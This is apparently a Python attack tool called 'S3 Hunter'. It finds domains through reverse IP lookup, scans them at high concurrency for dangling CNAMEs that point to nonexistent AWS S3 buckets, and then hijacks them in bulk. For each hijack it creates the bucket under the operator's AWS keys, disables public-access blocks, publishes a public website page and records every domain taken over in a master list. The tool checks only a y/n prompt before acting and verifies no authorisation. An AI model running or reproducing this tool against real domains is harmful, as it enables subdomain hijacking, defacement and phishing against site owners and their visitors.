#!/usr/bin/env python3
import requests
import dns.resolver
import boto3
import concurrent.futures
import argparse
import re
import json
import os
import sys
from datetime import datetime
from colorama import init, Fore, Style
import socket
import time

init()

def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] config.json not found!{Style.RESET_ALL}")
        sys.exit(1)

def print_banner():
    banner = f"""
{Fore.CYAN}
███████╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝╚════██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗ █████╔╝███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║ ╚═══██╗██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                      
{Fore.GREEN}[*] S3 Bucket Takeover Hunter
[*] By: @mandoelsz
[*] Version: 1.1{Style.RESET_ALL}
    """
    print(banner)

def reverse_ip_lookup(ip, config):
    params = {
        'reverseip': ip,
        'apikey': config['reverseip']['api_key']
    }
    
    try:
        response = requests.get(config['reverseip']['api_url'], params=params)
        if response.status_code == 200:
            data = response.json()
            if 'domains' in data:
                return [{'name': domain} for domain in data['domains']]
            else:
                print(f"{Fore.YELLOW}[WARNING] No domains found for {ip}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to perform reverse IP lookup for {ip}: {str(e)}{Style.RESET_ALL}")
    
    return []

def save_domains_to_file(domains, output_file):
    with open(output_file, 'w') as f:
        for domain in domains:
            f.write(f"{domain['name']}\n")

def get_hostname_info(domain):
    try:
        addrinfo = socket.getaddrinfo(domain, None)
        for addr in addrinfo:
            try:
                ip = addr[4][0]
                hostname = socket.gethostbyaddr(ip)[0].lower()
                if any(x in hostname for x in ['s3-website-', 's3.amazonaws.com', '.s3.', '.s3-website-']):
                    return (True, hostname)
            except:
                continue
                
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        try:
            answers = resolver.resolve(domain, 'A')
            for rdata in answers:
                ip = str(rdata)
                try:
                    hostname = socket.gethostbyaddr(ip)[0].lower()
                    if any(x in hostname for x in ['s3-website-', 's3.amazonaws.com', '.s3.', '.s3-website-']):
                        return (True, hostname)
                except:
                    continue
        except:
            pass
            
    except:
        pass
    
    return (False, None)

def check_s3_takeover_worker(domain):
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        try:
            response = requests.get(f'http://{domain}', timeout=5, allow_redirects=False)
            if response.status_code in [301, 302, 307, 308]:
                return (domain, False, None)
        except:
            pass

        try:
            answers = resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).lower()
                if any(x in cname for x in ['s3.amazonaws.com', 's3-website-', '.s3.', '.s3-website-']):
                    try:
                        response = requests.get(f'http://{domain}', timeout=5, allow_redirects=False)
                        if response.status_code == 404:
                            try:
                                bucket_response = requests.get(f'http://{domain}.s3.amazonaws.com')
                                if "NoSuchBucket" in bucket_response.text:
                                    region = extract_region_from_cname(domain)
                                    return (domain, True, region)
                            except:
                                pass
                    except requests.RequestException:
                        pass
        except dns.resolver.NoAnswer:
            pass
        except:
            pass

        is_s3, hostname = get_hostname_info(domain)
        if is_s3:
            try:
                response = requests.get(f'http://{domain}', timeout=5, allow_redirects=False)
                if response.status_code == 404:
                    try:
                        bucket_response = requests.get(f'http://{domain}.s3.amazonaws.com')
                        if "NoSuchBucket" in bucket_response.text:
                            region = extract_region_from_cname(domain)
                            return (domain, True, region)
                    except:
                        pass
            except requests.RequestException:
                pass

        return (domain, False, None)
            
    except Exception as e:
        return (domain, False, None)

def clean_domain(domain):
    patterns = [
        r'\.s3-website-[a-z0-9-]+\.amazonaws\.com$',
        r'\.s3\.amazonaws\.com$',
        r'\.s3-[a-z0-9-]+\.amazonaws\.com$'
    ]
    
    for pattern in patterns:
        domain = re.sub(pattern, '', domain.lower())
    return domain

def check_domains_concurrent(domains, max_workers=1000):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_domain = {executor.submit(check_s3_takeover_worker, domain): domain for domain in domains}
        for future in concurrent.futures.as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                result = future.result()
                if result[1]:
                    clean_domain_name = clean_domain(result[0])
                    print(f"{Fore.RED}[VULNERABLE] {result[0]}{Style.RESET_ALL}")
                    results.append(f"{clean_domain_name}, {result[2]}")
                else:
                    print(f"{Fore.GREEN}[SAFE] {result[0]} not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[ERROR] {domain}: {str(e)}{Style.RESET_ALL}")
    
    return results

def perform_takeover(domain, config):
    region = extract_region_from_cname(domain)
    print(f"  -> Attempting takeover in region: {region}")
    
    try:
        s3 = boto3.client('s3',
            region_name=region,
            aws_access_key_id=config['aws']['access_key'],
            aws_secret_access_key=config['aws']['secret_key']
        )
        
        if region == "us-east-1":
            s3.create_bucket(Bucket=domain)
        else:
            s3.create_bucket(
                Bucket=domain,
                CreateBucketConfiguration={'LocationConstraint': region}
            )
        print(f"  -> Bucket {domain} created successfully!")
        
        try:
            s3.put_public_access_block(
                Bucket=domain,
                PublicAccessBlockConfiguration={
                    'BlockPublicAcls': False,
                    'IgnorePublicAcls': False,
                    'BlockPublicPolicy': False,
                    'RestrictPublicBuckets': False
                }
            )
            print(f"  -> Block Public Access disabled for {domain}")
            
            s3.put_bucket_website(
                Bucket=domain,
                WebsiteConfiguration={
                    'IndexDocument': {'Suffix': 'index.html'},
                }
            )
            print(f"  -> Static website hosting configured for {domain}")
            
            s3.put_object(
                Bucket=domain,
                Key='index.html',
                Body=b'<html><body><h1>Bucket Taken Over!</h1></body></html>',
                ContentType='text/html'
            )
            print(f"  -> index.html uploaded to {domain}")
            
            bucket_policy = {
                'Version': '2012-10-17',
                'Statement': [{
                    'Sid': 'PublicReadGetObject',
                    'Effect': 'Allow',
                    'Principal': '*',
                    'Action': 's3:GetObject',
                    'Resource': f'arn:aws:s3:::{domain}/*'
                }]
            }
            s3.put_bucket_policy(Bucket=domain, Policy=json.dumps(bucket_policy))
            print(f"  -> Public bucket policy applied to {domain}")
            
            print(f"  -> Verifying takeover...")
            max_retries = 3
            for i in range(max_retries):
                try:
                    response = requests.get(f'http://{domain}/index.html', timeout=10, allow_redirects=False)
                    if response.status_code == 200 and "Bucket Taken Over!" in str(response.content):
                        print(f"{Fore.GREEN}  -> Takeover successful! {domain} is now accessible{Style.RESET_ALL}")
                        return True, region
                    time.sleep(2)
                except:
                    if i < max_retries - 1:
                        time.sleep(2)
            
            print(f"{Fore.RED}  -> Takeover verification failed. Cleaning up...{Style.RESET_ALL}")
            try:
                objects = s3.list_objects_v2(Bucket=domain)
                if 'Contents' in objects:
                    for obj in objects['Contents']:
                        s3.delete_object(Bucket=domain, Key=obj['Key'])
                s3.delete_bucket(Bucket=domain)
                print(f"  -> Bucket {domain} deleted due to failed verification")
            except Exception as e:
                print(f"  -> Failed to delete bucket: {str(e)}")
            return False, None
                
        except Exception as e:
            print(f"{Fore.RED}  -> Configuration failed. Cleaning up...{Style.RESET_ALL}")
            try:
                s3.delete_bucket(Bucket=domain)
                print(f"  -> Bucket {domain} deleted due to configuration failure")
            except:
                pass
            return False, None
            
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to takeover {domain}: {str(e)}{Style.RESET_ALL}")
        return False, None

def perform_bulk_takeover(domains, config):
    results = []
    for domain in domains:
        domain = domain.strip()
        if ',' in domain:
            domain = domain.split(',')[0].strip()
        
        print(f"\n{Fore.CYAN}[*] Processing {domain}{Style.RESET_ALL}")
        success, region = perform_takeover(domain, config)
        if success:
            results.append(f"{domain}, {region}")
    
    return results

def extract_region_from_cname(domain):
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        try:
            answers = resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                cname = str(rdata.target).lower()
                pattern1 = r"s3-website-([a-z0-9-]+)\.amazonaws\.com"
                pattern2 = r"s3\.([a-z0-9-]+)\.amazonaws\.com"
                pattern3 = r"\.s3-([a-z0-9-]+)\.amazonaws\.com"

                for pattern in [pattern1, pattern2, pattern3]:
                    match = re.search(pattern, cname)
                    if match:
                        return match.group(1)
        except:
            pass

        is_s3, hostname = get_hostname_info(domain)
        if is_s3 and hostname:
            for pattern in [pattern1, pattern2, pattern3]:
                match = re.search(pattern, hostname)
                if match:
                    return match.group(1)
                    
    except:
        pass
    
    return "us-east-1"

def update_takeover_list(successful_domains, timestamp=None):
    if timestamp is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    new_file = f"takeover_successful_{timestamp}.txt"
    with open(new_file, 'w') as f:
        for domain in successful_domains:
            f.write(f"{domain}\n")
    
    master_file = "takeover_master_list.txt"
    existing_domains = set()
    
    if os.path.exists(master_file):
        with open(master_file, 'r') as f:
            existing_domains = {line.strip() for line in f if line.strip()}
    
    existing_domains.update(successful_domains)
    
    with open(master_file, 'w') as f:
        for domain in sorted(existing_domains):
            f.write(f"{domain}\n")
    
    return new_file, master_file

def interactive_menu():
    while True:
        print(f"\n{Fore.CYAN}=== S3 Hunter Menu ==={Style.RESET_ALL}")
        print("1. Reverse IP Lookup")
        print("2. Check S3 Takeover Vulnerability")
        print("3. Full Scan (Reverse IP + Vulnerability Check)")
        print("4. Create Bucket for Domain(s)")
        print("5. Exit")
        
        choice = input(f"\n{Fore.GREEN}Choose an option (1-5): {Style.RESET_ALL}")
        
        if choice == "1":
            ip_file = input("Enter path to IP list file: ")
            output_file = input("Enter output file for domains (default: domains.txt): ") or "domains.txt"
            
            if not os.path.exists(ip_file):
                print(f"{Fore.RED}[ERROR] IP list file not found!{Style.RESET_ALL}")
                continue
                
            config = load_config()
            print(f"\n{Fore.CYAN}[*] Starting reverse IP lookup...{Style.RESET_ALL}")
            
            all_domains = []
            with open(ip_file, 'r') as f:
                for ip in f:
                    ip = ip.strip()
                    print(f"\n{Fore.YELLOW}[*] Processing {ip}{Style.RESET_ALL}")
                    domains = reverse_ip_lookup(ip, config)
                    if domains:
                        all_domains.extend(domains)
            
            save_domains_to_file(all_domains, output_file)
            print(f"\n{Fore.GREEN}[+] Found {len(all_domains)} domains. Saved to {output_file}{Style.RESET_ALL}")
            
        elif choice == "2":
            domain_file = input("Enter path to domain list file: ")
            output_file = input("Enter output file for vulnerable domains (default: vulnerable.txt): ") or "vulnerable.txt"
            
            if not os.path.exists(domain_file):
                print(f"{Fore.RED}[ERROR] Domain list file not found!{Style.RESET_ALL}")
                continue
                
            config = load_config()
            print(f"\n{Fore.CYAN}[*] Starting vulnerability check with 1000 threads...{Style.RESET_ALL}")
            
            try:
                with open(domain_file, 'r', encoding='utf-8') as f:
                    domains = []
                    for line in f:
                        domain = line.strip().split()[0] if line.strip() else None
                        if domain:
                            domains.append(domain)
            except UnicodeDecodeError:
                with open(domain_file, 'r', encoding='latin-1') as f:
                    domains = []
                    for line in f:
                        domain = line.strip().split()[0] if line.strip() else None
                        if domain:
                            domains.append(domain)
            
            vulnerable_domains = check_domains_concurrent(domains, max_workers=1000)
            
            with open(output_file, 'w') as f:
                for domain in vulnerable_domains:
                    f.write(f"{domain}\n")
                    
            print(f"\n{Fore.GREEN}[+] Found {len(vulnerable_domains)} vulnerable domains. Saved to {output_file}{Style.RESET_ALL}")
            if vulnerable_domains:
                print(f"{Fore.YELLOW}[*] To take over any of these domains, use Option 4 from the main menu.{Style.RESET_ALL}")
            
        elif choice == "3":
            ip_file = input("Enter path to IP list file: ")
            
            if not os.path.exists(ip_file):
                print(f"{Fore.RED}[ERROR] IP list file not found!{Style.RESET_ALL}")
                continue
                
            config = load_config()
            print(f"\n{Fore.CYAN}[*] Starting full scan...{Style.RESET_ALL}")
            
            all_domains = []
            with open(ip_file, 'r') as f:
                for ip in f:
                    ip = ip.strip()
                    print(f"\n{Fore.YELLOW}[*] Processing {ip}{Style.RESET_ALL}")
                    domains = reverse_ip_lookup(ip, config)
                    if domains:
                        all_domains.extend(domains)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domains_file = f"domains_{timestamp}.txt"
            save_domains_to_file(all_domains, domains_file)
            print(f"\n{Fore.GREEN}[+] Found {len(all_domains)} domains. Saved to {domains_file}{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}[*] Starting vulnerability check with 1000 threads...{Style.RESET_ALL}")
            domain_names = [d['name'] for d in all_domains]
            vulnerable_domains = check_domains_concurrent(domain_names, max_workers=1000)
            
            vuln_file = f"vulnerable_{timestamp}.txt"
            with open(vuln_file, 'w') as f:
                for domain in vulnerable_domains:
                    f.write(f"{domain}\n")
                    
            print(f"\n{Fore.GREEN}[+] Found {len(vulnerable_domains)} vulnerable domains. Saved to {vuln_file}{Style.RESET_ALL}")
            if vulnerable_domains:
                print(f"{Fore.YELLOW}[*] To take over any of these domains, use Option 4 from the main menu.{Style.RESET_ALL}")
            
        elif choice == "4":
            print("\nChoose takeover method:")
            print("1. Single domain")
            print("2. Bulk from file")
            takeover_choice = input("Enter choice (1/2): ")
            
            if takeover_choice == "1":
                domain = input("Enter domain to create bucket for: ")
                print(f"\n{Fore.YELLOW}[WARNING] This will attempt to create an S3 bucket for {domain}.{Style.RESET_ALL}")
                confirm = input("Are you sure you want to continue? (y/n): ").lower()
                if confirm != 'y':
                    continue
                    
                config = load_config()
                print(f"\n{Fore.CYAN}[*] Attempting to create bucket for {domain}...{Style.RESET_ALL}")
                success, region = perform_takeover(domain, config)
                if success:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_file, master_file = update_takeover_list([f"{domain}, {region}"], timestamp)
                    print(f"\n{Fore.GREEN}[+] Successfully took over domain. Updated lists:")
                    print(f"    - New takeover list: {new_file}")
                    print(f"    - Master takeover list: {master_file}{Style.RESET_ALL}")
                
            elif takeover_choice == "2":
                domain_file = input("Enter path to domain list file: ")
                if not os.path.exists(domain_file):
                    print(f"{Fore.RED}[ERROR] Domain list file not found!{Style.RESET_ALL}")
                    continue
                
                print(f"\n{Fore.YELLOW}[WARNING] This will attempt to create S3 buckets for all domains in the file.{Style.RESET_ALL}")
                confirm = input("Are you sure you want to continue? (y/n): ").lower()
                if confirm != 'y':
                    continue
                
                config = load_config()
                with open(domain_file, 'r') as f:
                    domains = [line.strip() for line in f if line.strip()]
                
                print(f"\n{Fore.CYAN}[*] Starting bulk takeover for {len(domains)} domains...{Style.RESET_ALL}")
                successful = perform_bulk_takeover(domains, config)
                
                if successful:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_file, master_file = update_takeover_list(successful, timestamp)
                    print(f"\n{Fore.GREEN}[+] Successfully took over {len(successful)} domains. Updated lists:")
                    print(f"    - New takeover list: {new_file}")
                    print(f"    - Master takeover list: {master_file}{Style.RESET_ALL}")
            
            else:
                print(f"{Fore.RED}[ERROR] Invalid choice!{Style.RESET_ALL}")
            
        elif choice == "5":
            print(f"\n{Fore.CYAN}[*] Thanks for using S3 Hunter!{Style.RESET_ALL}")
            break
        
        else:
            print(f"\n{Fore.RED}[ERROR] Invalid choice!{Style.RESET_ALL}")

def main():
    print_banner()
    interactive_menu()

if __name__ == "__main__":
    main()